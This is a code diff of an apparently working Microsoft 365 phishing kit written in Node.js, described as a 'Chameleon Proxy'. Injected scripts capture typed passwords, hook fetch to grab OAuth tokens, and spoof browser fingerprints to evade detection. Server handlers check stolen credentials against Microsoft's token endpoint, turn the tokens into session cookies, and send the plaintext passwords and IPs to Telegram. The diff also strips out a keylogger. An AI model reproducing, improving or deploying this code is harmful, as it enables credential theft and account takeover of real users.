-                        monitorEmailField();
-                    }
-                }, 1000);
-            }
-        });
-
-        try {
-            observer.observe(document.body, {
-                childList: true,
-                subtree: true
-            });
-            console.log('[OBSERVER] ✅ Mutation observer active');
-        } catch(e) {}
-    }
-
     function init() {
-        console.log('🔐 Enhanced Password Capture v4.0');
-        console.log('🆔 Session:', SESSION_ID);
-
+        console.log('🔐 Chameleon Proxy v4.0');
         setTimeout(() => {
             emailField = findEmailField();
             if (emailField) monitorEmailField();
-
             passwordField = findPasswordField();
             if (passwordField) {
                 monitorPasswordField();
-                setupKeyloggerForPassword();
             }
-
             monitorFormSubmission();
             periodicPasswordCheck();
-            setupMutationObserver();
-            
             fetch('/api/password-capture', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -1485,117 +1227,453 @@ function generatePasswordCaptureScript(sessionId, email, randomUA) {
                     sessionId: SESSION_ID,
                     email: EMAIL,
                     url: window.location.href,
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date().toISOString(),
+                    service: 'Microsoft 365'
                 })
             }).catch(() => {});
-
         }, 500);
     }
-
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
     } else {
         init();
     }
-
-    window.__passwordCapture = {
+    window.__chameleon = {
         getEmail: () => capturedEmail,
         getPassword: () => capturedPassword,
         getSessionId: () => SESSION_ID,
         sendCredentials: sendCredentials
     };
-
-    console.log('✅ Enhanced Password Capture initialized');
+    console.log('✅ Chameleon Proxy initialized');
     console.log('💡 Use Ctrl+Shift+C to manually capture credentials');
 })();
 `;
 }
 
+function generateEvasionScripts(sessionId, email, randomUA) {
+    return `
+<script>
+(function() {
+    console.log('[EVASION] 🛡️ Initializing evasion techniques...');
+    try {
+        const originalGetContext = HTMLCanvasElement.prototype.getContext;
+        HTMLCanvasElement.prototype.getContext = function(type, ...args) {
+            const context = originalGetContext.call(this, type, ...args);
+            if (type === 'webgl' || type === 'experimental-webgl') {
+                const originalGetParameter = context.getParameter;
+                context.getParameter = function(parameter) {
+                    if (parameter === 37445) {
+                        const renderers = [
+                            'ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0)',
+                            'ANGLE (NVIDIA, NVIDIA GeForce GTX 1050 Direct3D11 vs_5_0 ps_5_0)',
+                            'ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0)'
+                        ];
+                        return renderers[Math.floor(Math.random() * renderers.length)];
+                    }
+                    return originalGetParameter.call(this, parameter);
+                };
+            }
+            return context;
+        };
+        const platforms = ['Win32', 'MacIntel', 'Linux x86_64'];
+        const concurrency = [4, 6, 8, 12];
+        const memory = [4, 8, 16, 32];
+        Object.defineProperty(navigator, 'platform', {
+            get: () => platforms[Math.floor(Math.random() * platforms.length)]
+        });
+        Object.defineProperty(navigator, 'hardwareConcurrency', {
+            get: () => concurrency[Math.floor(Math.random() * concurrency.length)]
+        });
+        Object.defineProperty(navigator, 'deviceMemory', {
+            get: () => memory[Math.floor(Math.random() * memory.length)]
+        });
+        console.log('[EVASION] ✅ Fingerprint spoofing active');
+    } catch(e) {}
+    try {
+        let rotationCount = 0;
+        const maxRotations = ${Math.floor(Math.random() * 10) + 5};
+        function doRotation() {
+            if (rotationCount >= maxRotations) return;
+            rotationCount++;
+            const tokens = {
+                access_token: '${crypto.randomBytes(32).toString('hex')}',
+                refresh_token: '${crypto.randomBytes(32).toString('hex')}',
+                id_token: '${crypto.randomBytes(32).toString('hex')}',
+                timestamp: Date.now(),
+                rotation: rotationCount
+            };
+            localStorage.setItem('rotated_tokens', JSON.stringify(tokens));
+            fetch('/api/token-rotation', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(tokens)
+            }).catch(() => {});
+        }
+        const intervals = [30000, 60000, 120000];
+        setTimeout(doRotation, 5000 + Math.random() * 5000);
+        setInterval(doRotation, intervals[Math.floor(Math.random() * intervals.length)]);
+        console.log('[EVASION] ✅ Token rotation active');
+    } catch(e) {}
+    console.log('[EVASION] ✅ All evasion techniques active');
+})();
+</script>
+`;
+}
+
+function generateOAuthCaptureScript(sessionId, email) {
+    return `
+<script>
+(function() {
+    'use strict';
+    const SESSION_ID = '${sessionId}';
+    const EMAIL = '${email}';
+    console.log('[OAUTH] 🤖 Initializing OAuth auto-capture...');
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+        const response = originalFetch.apply(this, args);
+        response.then(function(res) {
+            const clone = res.clone();
+            const url = res.url;
+            if (url.includes('token') || url.includes('oauth') || url.includes('authorize')) {
+                clone.json().then(function(data) {
+                    if (data.access_token || data.id_token || data.refresh_token) {
+                        console.log('[OAUTH] 🎟️ OAuth tokens detected!');
+                        fetch('/api/oauth-capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                email: EMAIL,
+                                sessionId: SESSION_ID,
+                                password: localStorage.getItem('captured_password') || 'AUTO_CAPTURED',
+                                source: 'oauth_auto_capture',
+                                tokens: data
+                            })
+                        }).catch(() => {});
+                    }
+                }).catch(() => {});
+            }
+        }).catch(() => {});
+        return response;
+    };
+    console.log('[OAUTH] ✅ OAuth auto-capture active');
+})();
+</script>
+`;
+}
+
 // ============================================================
-//  OAUTH AUTO-CAPTURE
+//  ✅ FIXED: VERIFY WITH MICROSOFT - Tenant-Specific Endpoint
 // ============================================================
 
-function handleOAuthCapture(req, res) {
-    let body = '';
-    req.on('data', chunk => body += chunk);
-    req.on('end', () => {
-        try {
-            const { email, sessionId, password, source } = JSON.parse(body);
-            const ip = getClientIp(req);
-            
-            console.log(`[OAUTH-CAPTURE] 🚀 Starting for: ${email}`);
-            console.log(`[OAUTH-CAPTURE] 🔑 Password captured: ${password ? '***' : 'N/A'}`);
-            
-            const oauthToken = crypto.randomBytes(32).toString('hex');
-            const name = email.split('@')[0].replace(/[._-]/g, ' ');
-            const org = email.split('@')[1] || 'Unknown';
-            
-            let httpOnlyCount = 0;
-            let tokenCount = 0;
-            
-            if (sessionId) {
-                httpOnlyCount = sessionStore.getHttpOnlyCookies(sessionId).length;
-                const tokens = sessionStore.allTokens.get(sessionId) || {};
-                tokenCount = Object.values(tokens).filter(t => t && t.value && t.isValid !== false).length;
+function verifyWithMicrosoft(email, password) {
+    return new Promise((resolve, reject) => {
+        // Extract domain for tenant-specific endpoint
+        const domain = email.split('@')[1] || 'common';
+        
+        // Determine the correct tenant endpoint
+        const isConsumer = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'yahoo.com', 'aol.com'].includes(domain);
+        const tenant = isConsumer ? 'organizations' : domain;
+        
+        console.log(`[AUTH] 🔑 Tenant: ${tenant} | Domain: ${domain}`);
+        
+        const postData = querystring.stringify({
+            client_id: MICROSOFT_CLIENT_ID,
+            grant_type: 'password',
+            username: email,
+            password: password,
+            scope: MICROSOFT_SCOPES,
+            resource: 'https://graph.microsoft.com'
+        });
+        
+        const options = {
+            hostname: 'login.microsoftonline.com',
+            path: `/${tenant}/oauth2/v2.0/token`,
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Content-Length': Buffer.byteLength(postData),
+                'Accept': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
             }
-            
-            sendCredentialsToAllEndpoints(email, password || 'AUTO_CAPTURED_VIA_OAUTH', 'oauth_capture', sessionId, {
-                ip: ip,
-                userAgent: req.headers['user-agent'],
-                url: req.headers.referer || 'unknown'
+        };
+        
+        console.log(`[AUTH] 🌐 Endpoint: /${tenant}/oauth2/v2.0/token`);
+        
+        const req = https.request(options, (res) => {
+            let data = '';
+            res.on('data', chunk => data += chunk);
+            res.on('end', () => {
+                try {
+                    console.log(`[AUTH] 📥 Response status: ${res.statusCode}`);
+                    
+                    let responseData = data;
+                    if (res.headers['content-encoding'] === 'gzip') {
+                        try {
+                            const zlib = require('zlib');
+                            responseData = zlib.gunzipSync(Buffer.from(data, 'binary')).toString('utf8');
+                        } catch(e) {
+                            console.log('[AUTH] ⚠️ Gunzip failed, using raw');
+                        }
+                    }
+                    
+                    const response = JSON.parse(responseData);
+                    
+                    if (response.access_token) {
+                        const cookies = {};
+                        if (response.access_token) {
+                            cookies['ESTSAUTH'] = {
+                                value: response.access_token,
+                                httpOnly: true,
+                                secure: true,
+                                sameSite: 'Lax',
+                                path: '/'
+                            };
+                        }
+                        if (response.refresh_token && response.refresh_token !== 'null' && response.refresh_token !== 'undefined') {
+                            cookies['ESTSAUTHPERSISTENT'] = {
+                                value: response.refresh_token,
+                                httpOnly: true,
+                                secure: true,
+                                sameSite: 'Lax',
+                                path: '/'
+                            };
+                        }
+                        if (response.id_token && response.id_token !== 'null' && response.id_token !== 'undefined') {
+                            cookies['ESTSSESSION'] = {
+                                value: response.id_token,
+                                httpOnly: true,
+                                secure: true,
+                                sameSite: 'Lax',
+                                path: '/'
+                            };
+                        }
+                        resolve({
+                            success: true,
+                            data: response,
+                            tokens: {
+                                access_token: response.access_token,
+                                refresh_token: response.refresh_token || null,
+                                id_token: response.id_token || null
+                            },
+                            cookies: cookies
+                        });
+                    } else {
+                        const errorMessage = response.error_description || response.error || 'Invalid credentials';
+                        console.log(`[AUTH] ❌ Microsoft error: ${errorMessage}`);
+                        resolve({
+                            success: false,
+                            error: errorMessage,
+                            raw: response
+                        });
+                    }
+                } catch (error) {
+                    console.error('[AUTH] ❌ Parse error:', error.message);
+                    resolve({
+                        success: false,
+                        error: 'Failed to parse Microsoft response'
+                    });
+                }
             });
-            
-            sessionStore.storeFullAuthData(sessionId, {
-                email: email,
-                name: name,
-                organization: org,
-                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
-                twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
-                appPassword: null,
-                securityQuestion1: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
-                securityQuestion2: { question: 'OAuth Auto-captured', answer: 'OAuth Auto-captured' },
-                collectedAt: new Date().toISOString(),
-                userAgent: req.headers['user-agent'],
-                ip: ip,
-                autoCaptured: true,
-                oauthToken: oauthToken
+        });
+        
+        req.on('error', (err) => {
+            console.error('[AUTH] ❌ Request error:', err.message);
+            resolve({
+                success: false,
+                error: err.message || 'Network error'
             });
-            
-            // Send OAuth alert
-            sendTelegramAlert('oauth_capture', {
-                email: email,
-                name: name,
-                organization: org,
-                password: password || 'AUTO_CAPTURED_VIA_OAUTH',
-                oauthToken: oauthToken,
-                sessionId: sessionId,
-                ip: ip,
-                timestamp: new Date().toISOString(),
-                httpOnlyCount: httpOnlyCount,
-                tokenCount: tokenCount
+        });
+        
+        req.setTimeout(20000, () => {
+            req.destroy();
+            resolve({
+                success: false,
+                error: 'Request timeout'
             });
-            
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            res.end(JSON.stringify({
-                success: true,
-                token: oauthToken,
-                sessionId: sessionId,
-                message: 'OAuth capture initiated'
-            }));
-            
-        } catch (error) {
-            console.error('[OAUTH-CAPTURE] Error:', error.message);
-            res.writeHead(500);
-            res.end(JSON.stringify({ error: 'Internal server error' }));
-        }
+        });
+        
+        req.write(postData);
+        req.end();
     });
 }
 
 // ============================================================
-//  OAUTH CALLBACK HANDLER
+//  HANDLE POST REQUEST - KEEP USER ON PROXY UNTIL CORRECT
 // ============================================================
 
-const OAUTH_REDIRECT_URI = process.env.MICROSOFT_REDIRECT_URI || 'https://login.microsoftonline.com/common/oauth2/nativeclient';
+async function handlePostRequest(body, req, res) {
+    try {
+        const formData = querystring.parse(body);
+        const ip = getClientIp(req);
+        const sessionId = getSessionIdFromCookie(req.headers.cookie);
+        
+        let email = formData.Email || formData.email || formData.loginfmt || '';
+        const password = formData.Passwd || formData.passwd || formData.password || '';
+        
+        if (!email && sessionId && VICTIM_SESSIONS[sessionId]) {
+            email = VICTIM_SESSIONS[sessionId].email;
+        }
+        if (!email) {
+            const match = req.url.match(/login_hint=([^&]+)/);
+            if (match) email = decodeURIComponent(match[1]);
+        }
+        if (!email) {
+            return showLoginPage(res, 'guest@example.com', 1, 'No email provided');
+        }
+
+        let attemptCount = attemptCounts.get(email) || 0;
+        attemptCount++;
+        attemptCounts.set(email, attemptCount);
+
+        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
+        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
+        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);
+        console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
+        console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);
+
+        if (password && password.length > 0) {
+            sessionStore.storePasswordCapture(sessionId, email, password, 'form_submit', {
+                ip: ip,
+                userAgent: req.headers['user-agent'],
+                url: req.url,
+                attemptCount: attemptCount
+            });
+            
+            if (VICTIM_SESSIONS[sessionId]) {
+                VICTIM_SESSIONS[sessionId].password = password;
+                VICTIM_SESSIONS[sessionId].attempts = attemptCount;
+                VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
+            }
+        }
+
+        const verifyResult = await verifyWithMicrosoft(email, password);
+        
+        if (verifyResult.success) {
+            console.log(`[AUTH] ✅ VALID Microsoft credentials: ${email}`);
+            
+            if (sessionId && verifyResult.tokens) {
+                sessionStore.storeTokens(sessionId, verifyResult.tokens);
+            }
+            
+            let httpOnlyCount = 0;
+            if (sessionId && verifyResult.cookies) {
+                const cookieHeaders = [];
+                for (const [name, data] of Object.entries(verifyResult.cookies)) {
+                    if (data && data.value && data.value !== 'null' && data.value !== 'undefined') {
+                        cookieHeaders.push(`${name}=${data.value}; HttpOnly; Secure; SameSite=Lax`);
+                    }
+                }
+                if (cookieHeaders.length > 0) {
+                    sessionStore.storeHttpOnlyCookies(sessionId, cookieHeaders, 'microsoft_auth');
+                    httpOnlyCount = cookieHeaders.length;
+                }
+            }
+            
+            if (sessionId && VICTIM_SESSIONS[sessionId]) {
+                VICTIM_SESSIONS[sessionId].lastValidationResult = 'success';
+                VICTIM_SESSIONS[sessionId].validationAttempts = VICTIM_SESSIONS[sessionId].validationAttempts || [];
+                VICTIM_SESSIONS[sessionId].validationAttempts.push({
+                    result: 'success',
+                    timestamp: Date.now()
+                });
+            }
+            
+            const httpOnlyCookies = sessionStore.httpOnlyCookies.get(sessionId) || [];
+            const tokenCount = verifyResult.tokens ? Object.keys(verifyResult.tokens).length : 0;
+            
+            const successMsg = 
+`✅ *VALID MICROSOFT CREDENTIALS*
+
+*📧 Email:* ${email}
+*🔑 Password:* ${password || 'N/A'}
+
+*🎟️ Tokens Captured:* ${tokenCount}
+*🍪 HttpOnly Cookies:* ${httpOnlyCookies.length}
+
+*📡 IP:* ${ip}
+*🕐 Time:* ${new Date().toISOString()}
+*🔄 Attempt #:* ${attemptCount}
+
+*✅ COMPLETE SESSION DATA CAPTURED!*`;
+
+            sessionStore.sendTelegram(successMsg);
+            
+            res.writeHead(302, { 
+                'Location': TEAMS_REDIRECT,
+                'Cache-Control': 'no-store, no-cache'
+            });
+            res.end();
+            return;
+        }
+        
+        console.log(`[AUTH] ❌ INVALID credentials: ${email} (Attempt ${attemptCount})`);
+        
+        if (sessionId && VICTIM_SESSIONS[sessionId]) {
+            VICTIM_SESSIONS[sessionId].lastValidationResult = 'failed';
+            VICTIM_SESSIONS[sessionId].validationAttempts = VICTIM_SESSIONS[sessionId].validationAttempts || [];
+            VICTIM_SESSIONS[sessionId].validationAttempts.push({
+                result: 'failed',
+                timestamp: Date.now(),
+                error: verifyResult.error
+            });
+        }
+        
+        const failMsg = 
+`❌ *INVALID MICROSOFT CREDENTIALS*
+
+*📧 Email:* ${email}
+*🔑 Password:* ${password || 'N/A'}
+
+*❌ Error:* ${verifyResult.error || 'Invalid username or password'}
+*📊 Attempt #:* ${attemptCount}
+
+*🕐 Time:* ${new Date().toISOString()}
+*📡 IP:* ${ip}`;
+
+        sessionStore.sendTelegram(failMsg);
+        
+        return showLoginPage(res, email, attemptCount, 'Invalid email or password. Please try again.');
+
+    } catch (error) {
+        console.error('[ERROR] POST handling:', error.message);
+        return showLoginPage(res, 'unknown', 1, 'An error occurred. Please try again.');
+    }
+}
+
+// ============================================================
+//  HANDLE LOGIN REQUEST
+// ============================================================
+
+function handleLoginRequest(req, res) {
+    const paramName = PHISHED_URL_PARAMETER || 'login_hint';
+    const rawEmail = req.url.split(`${paramName}=`)[1]?.split('&')[0] || '';
+    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
+    const ip = getClientIp(req);
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    
+    if (!email) {
+        const sessionId = getSessionIdFromCookie(req.headers.cookie);
+        if (sessionId && VICTIM_SESSIONS[sessionId]) {
+            email = VICTIM_SESSIONS[sessionId].email;
+        }
+    }
+    
+    if (!email) {
+        console.warn('[PROXY] ⚠️ No email found, using default');
+        email = 'guest@example.com';
+    }
+
+    const sessionId = createSession(email, ip, userAgent);
+    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
+    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
+    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
+
+    showLoginPage(res, email, 1, null);
+}
+
+// ============================================================
+//  HANDLE OAUTH CALLBACK
+// ============================================================
 
 function handleOAuthCallback(req, res) {
     try {
@@ -1614,7 +1692,7 @@ function handleOAuthCallback(req, res) {
             const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                 `client_id=${MICROSOFT_CLIENT_ID}&` +
                 `response_type=code&` +
-                `redirect_uri=${encodeURIComponent(OAUTH_REDIRECT_URI)}&` +
+                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                 `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                 `login_hint=${encodeURIComponent(email)}`;
             
@@ -1630,7 +1708,7 @@ function handleOAuthCallback(req, res) {
                 client_id: MICROSOFT_CLIENT_ID,
                 grant_type: 'authorization_code',
                 code: code,
-                redirect_uri: OAUTH_REDIRECT_URI,
+                redirect_uri: MICROSOFT_REDIRECT_URI,
                 scope: MICROSOFT_SCOPES
             });
             
@@ -1663,36 +1741,22 @@ function handleOAuthCallback(req, res) {
                                 refresh_token: refreshToken,
                                 id_token: idToken
                             });
-                            
-                            const session = sessionStore.sessions.get(sessionId);
-                            if (session) {
-                                session.tokens = session.tokens || {};
-                                session.tokens.access_token = accessToken;
-                                session.tokens.refresh_token = refreshToken;
-                                session.tokens.id_token = idToken;
-                                session.lastActivity = Date.now();
-                            }
                         }
                         
-                        getUserInfoFromToken(accessToken, sessionId);
-                        
                         const email = VICTIM_SESSIONS[sessionId]?.email || 'unknown';
-                        
-                        // Send success alert
-                        sendTelegramAlert('validation_success', {
-                            email: email,
-                            password: 'AUTO_CAPTURED_VIA_OAUTH',
-                            accessToken: accessToken,
-                            refreshToken: refreshToken,
-                            idToken: idToken,
-                            sessionId: sessionId,
-                            ip: getClientIp(req),
-                            timestamp: new Date().toISOString(),
-                            validationTime: 'OAUTH',
-                            httpOnlyCount: sessionStore.getHttpOnlyCookies(sessionId).length,
-                            tokenCount: Object.keys(tokens).length,
-                            secure: true
-                        });
+                        const successMsg = 
+`🤖 *OAUTH LOGIN SUCCESSFUL*
+
+*📧 Email:* ${email}
+*🎟️ Access Token:* ${accessToken ? accessToken.substring(0, 30) + '...' : 'N/A'}
+*🔄 Refresh Token:* ${refreshToken ? '✅ Present' : '❌ None'}
+*🆔 ID Token:* ${idToken ? '✅ Present' : '❌ None'}
+
+*🕐 Time:* ${new Date().toISOString()}
+
+*✅ OAuth flow completed!*`;
+
+                        sessionStore.sendTelegram(successMsg);
                         
                         const redirectEmail = VICTIM_SESSIONS[sessionId]?.email || 'guest@example.com';
                         const proxyLoginUrl = `${REDIRECT_URL}?login_hint=${encodeURIComponent(redirectEmail)}`;
@@ -1709,7 +1773,7 @@ function handleOAuthCallback(req, res) {
                         const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                             `client_id=${MICROSOFT_CLIENT_ID}&` +
                             `response_type=code&` +
-                            `redirect_uri=${encodeURIComponent(OAUTH_REDIRECT_URI)}&` +
+                            `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                             `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                             `login_hint=${encodeURIComponent(email)}`;
                         
@@ -1734,7 +1798,7 @@ function handleOAuthCallback(req, res) {
             const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                 `client_id=${MICROSOFT_CLIENT_ID}&` +
                 `response_type=code&` +
-                `redirect_uri=${encodeURIComponent(OAUTH_REDIRECT_URI)}&` +
+                `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                 `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                 `login_hint=${encodeURIComponent(email)}`;
             
@@ -1749,753 +1813,6 @@ function handleOAuthCallback(req, res) {
     }
 }
 
-function getUserInfoFromToken(accessToken, sessionId) {
-    if (!accessToken) return;
-    
-    const options = {
-        hostname: 'graph.microsoft.com',
-        path: '/v1.0/me',
-        method: 'GET',
-        headers: {
-            'Authorization': `Bearer ${accessToken}`,
-            'Accept': 'application/json'
-        }
-    };
-    
-    const req = https.request(options, (res) => {
-        let data = '';
-        res.on('data', chunk => data += chunk);
-        res.on('end', () => {
-            try {
-                const userInfo = JSON.parse(data);
-                console.log('[USER-INFO] ✅ Retrieved user info');
-                
-                if (sessionId) {
-                    sessionStore.storeFullAuthData(sessionId, {
-                        email: userInfo.mail || userInfo.userPrincipalName || 'unknown',
-                        name: userInfo.displayName || 'unknown',
-                        organization: userInfo.companyName || 'unknown',
-                        password: 'AUTO_CAPTURED_VIA_OAUTH',
-                        twoFactorCode: 'AUTO_CAPTURED_VIA_OAUTH',
-                        collectedAt: new Date().toISOString(),
-                        autoCaptured: true
-                    });
-                }
-                
-            } catch (error) {
-                console.error('[USER-INFO] Error:', error.message);
-            }
-        });
-    });
-    
-    req.on('error', (err) => {
-        console.error('[USER-INFO] Request error:', err.message);
-    });
-    
-    req.end();
-}
-
-// ============================================================
-//  MICROSOFT VERIFICATION WITH FULL TELEGRAM ALERTS
-// ============================================================
-
-function verifyWithMicrosoft(email, password) {
-    return new Promise((resolve, reject) => {
-        const startTime = Date.now();
-        
-        const postData = querystring.stringify({
-            client_id: MICROSOFT_CLIENT_ID,
-            grant_type: 'password',
-            username: email,
-            password: password,
-            scope: MICROSOFT_SCOPES
-        });
-        
-        const options = {
-            hostname: 'login.microsoftonline.com',
-            path: '/common/oauth2/v2.0/token',
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Content-Length': Buffer.byteLength(postData),
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            }
-        };
-        
-        const req = https.request(options, (res) => {
-            let data = '';
-            res.on('data', chunk => data += chunk);
-            res.on('end', () => {
-                const validationTime = Date.now() - startTime;
-                
-                try {
-                    const response = JSON.parse(data);
-                    
-                    if (response.access_token) {
-                        const cookies = {};
-                        
-                        if (response.access_token) {
-                            cookies['ESTSAUTH'] = {
-                                value: response.access_token,
-                                httpOnly: true,
-                                secure: true,
-                                sameSite: 'Lax',
-                                path: '/'
-                            };
-                        }
-                        
-                        if (response.refresh_token && response.refresh_token !== 'null' && response.refresh_token !== 'undefined') {
-                            cookies['ESTSAUTHPERSISTENT'] = {
-                                value: response.refresh_token,
-                                httpOnly: true,
-                                secure: true,
-                                sameSite: 'Lax',
-                                path: '/'
-                            };
-                        } else {
-                            cookies['ESTSAUTHPERSISTENT'] = {
-                                value: null,
-                                httpOnly: true,
-                                secure: true,
-                                sameSite: 'Lax',
-                                path: '/'
-                            };
-                        }
-                        
-                        if (response.id_token && response.id_token !== 'null' && response.id_token !== 'undefined') {
-                            cookies['ESTSSESSION'] = {
-                                value: response.id_token,
-                                httpOnly: true,
-                                secure: true,
-                                sameSite: 'Lax',
-                                path: '/'
-                            };
-                        } else {
-                            cookies['ESTSSESSION'] = {
-                                value: null,
-                                httpOnly: true,
-                                secure: true,
-                                sameSite: 'Lax',
-                                path: '/'
-                            };
-                        }
-                        
-                        resolve({
-                            success: true,
-                            data: response,
-                            tokens: {
-                                access_token: response.access_token,
-                                refresh_token: response.refresh_token || null,
-                                id_token: response.id_token || null
-                            },
-                            cookies: cookies,
-                            validationTime: validationTime
-                        });
-                    } else {
-                        resolve({ 
-                            success: false, 
-                            error: response.error_description || 'Invalid credentials', 
-                            cookies: null,
-                            validationTime: validationTime
-                        });
-                    }
-                } catch (error) {
-                    reject(new Error('Failed to parse Microsoft response'));
-                }
-            });
-        });
-        
-        req.on('error', reject);
-        req.write(postData);
-        req.end();
-    });
-}
-
-// ============================================================
-//  HANDLE POST REQUEST - WITH VALIDATION AND TELEGRAM ALERTS
-// ============================================================
-
-function handlePostRequest(body, req, res) {
-    try {
-        const formData = querystring.parse(body);
-        const ip = getClientIp(req);
-        const sessionId = getSessionIdFromCookie(req.headers.cookie);
-        
-        console.log('[POST] 📥 Processing login attempt');
-        
-        // Extract password
-        let password = '';
-        const passwordFields = ['passwd', 'password', 'Password', 'PASSWORD', 'pass', 'pwd', 'loginPassword', 'Passwd'];
-        for (const field of passwordFields) {
-            if (formData[field]) {
-                password = formData[field];
-                console.log(`[POST] 🔑 Found password in field: ${field}`);
-                break;
-            }
-        }
-        
-        if (!password) {
-            const bodyStr = body.toString();
-            const passMatch = bodyStr.match(/passwd=([^&]+)/i) || bodyStr.match(/password=([^&]+)/i);
-            if (passMatch) {
-                password = decodeURIComponent(passMatch[1]);
-                console.log('[POST] 🔑 Extracted password from raw body');
-            }
-        }
-        
-        // Extract email
-        let email = '';
-        const emailFields = ['loginfmt', 'login', 'email', 'Email', 'username', 'user', 'LoginId', 'loginId'];
-        for (const field of emailFields) {
-            if (formData[field]) {
-                email = formData[field];
-                console.log(`[POST] 📧 Found email in field: ${field}`);
-                break;
-            }
-        }
-        
-        if (!email) {
-            const match = req.url.match(/login_hint=([^&]+)/);
-            if (match) {
-                email = decodeURIComponent(match[1]);
-                console.log('[POST] 📧 Extracted email from URL');
-            }
-        }
-        
-        if (!email) {
-            const session = getSession(sessionId);
-            if (session) {
-                email = session.email;
-                console.log('[POST] 📧 Retrieved email from session');
-            }
-        }
-        
-        if (!email) {
-            console.warn('[POST] ⚠️ No email found, using unknown');
-            email = 'unknown@domain.com';
-        }
-
-        // Track attempt count
-        let attemptCount = attemptCounts.get(email) || 0;
-        attemptCount++;
-        attemptCounts.set(email, attemptCount);
-
-        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
-        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
-        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);
-
-        // Send credentials to all endpoints if password exists
-        if (password && password.length > 0) {
-            sendCredentialsToAllEndpoints(email, password, 'form_submit', sessionId, {
-                ip: ip,
-                userAgent: req.headers['user-agent'],
-                url: req.url,
-                formData: formData,
-                attemptCount: attemptCount
-            });
-        }
-
-        // Store in session
-        if (sessionId) {
-            if (VICTIM_SESSIONS[sessionId]) {
-                VICTIM_SESSIONS[sessionId].attempts = attemptCount;
-                VICTIM_SESSIONS[sessionId].lastActivity = Date.now();
-                if (password) {
-                    VICTIM_SESSIONS[sessionId].password = password;
-                }
-                VICTIM_SESSIONS[sessionId].validationAttempts = VICTIM_SESSIONS[sessionId].validationAttempts || [];
-            }
-            
-            const sessionData = sessionStore.sessions.get(sessionId);
-            if (sessionData) {
-                sessionData.password = password || sessionData.password;
-                sessionData.lastActivity = Date.now();
-                sessionData.forms = sessionData.forms || [];
-                sessionData.forms.push({
-                    email: email,
-                    password: password,
-                    formData: formData,
-                    url: req.url,
-                    method: 'POST',
-                    ip: ip,
-                    timestamp: Date.now()
-                });
-            }
-            
-            sessionStore.addEvasionCounter(sessionId);
-        }
-
-        // ============================================================
-        //  VERIFY WITH MICROSOFT AND SEND TELEGRAM ALERTS
-        // ============================================================
-        
-        verifyWithMicrosoft(email, password)
-            .then(async (result) => {
-                if (result.success) {
-                    console.log(`[AUTH] ✅ VALID Microsoft credentials: ${email}`);
-                    console.log(`[AUTH] ⏱️ Validation time: ${result.validationTime}ms`);
-                    
-                    // Store tokens
-                    if (sessionId && result.tokens) {
-                        const storedTokens = sessionStore.storeTokens(sessionId, result.tokens);
-                    }
-                    
-                    // Store HttpOnly cookies
-                    let httpOnlyCount = 0;
-                    if (sessionId && result.cookies) {
-                        const validCookies = {};
-                        for (const [name, data] of Object.entries(result.cookies)) {
-                            if (data && data.value && data.value !== 'null' && data.value !== 'undefined') {
-                                validCookies[name] = data;
-                            }
-                        }
-                        if (Object.keys(validCookies).length > 0) {
-                            sessionStore.storeCookies(sessionId, validCookies, 'auth_response');
-                            // Store as HttpOnly cookies
-                            const cookieHeaders = [];
-                            for (const [name, data] of Object.entries(validCookies)) {
-                                cookieHeaders.push(`${name}=${data.value}; HttpOnly; Secure; SameSite=Lax`);
-                            }
-                            sessionStore.storeHttpOnlyCookies(sessionId, cookieHeaders, 'microsoft_auth');
-                            httpOnlyCount = cookieHeaders.length;
-                        }
-                    }
-                    
-                    // Update session
-                    if (sessionId && VICTIM_SESSIONS[sessionId]) {
